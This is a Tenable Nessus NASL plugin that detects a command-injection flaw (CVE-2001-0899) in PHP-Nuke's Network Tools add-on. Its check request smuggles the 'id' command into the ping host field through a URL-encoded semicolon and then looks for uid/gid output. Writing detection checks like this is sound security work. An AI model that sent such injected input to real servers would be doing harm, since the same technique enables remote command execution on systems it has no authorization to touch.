#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(11106);
  script_version ("$Revision: 1.13 $");
  script_cve_id("CVE-2001-0899");
  script_xref(name:"OSVDB", value:"5529");

  script_name(english:"PHP-Nuke Network Tools Add-On Arbitrary Command Execution");
  script_summary(english:"Executed 'id' through index.php");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to an access control breach.'
  );

  script_set_attribute(
    attribute:'description',
    value:"It is possible to make the remote host execute arbitrary
commands through the use of the PHPNuke addon called
'Network Tools'.

An attacker may use this flaw to gain a shell on this system."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to NetTools 0.3 or newer"
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://www.isecurelabs.com/article.php?sid=209'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P'
  );

  script_end_attributes();

  script_category(ACT_ATTACK);

  script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("php_nuke_installed.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
installed = get_kb_item("www/" + port + "/php-nuke");
if ( ! installed ) exit(0);
array = eregmatch(pattern:"(.*) under (.*)", string:installed);
if ( ! array ) exit(0);
dir = array[2];


http_check_remote_code (
      unique_dir:dir,
      check_request:"/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid",
      check_result:"uid=[0-9]+.*gid=[0-9]+.*",
      command:"id",
      port:port
      );
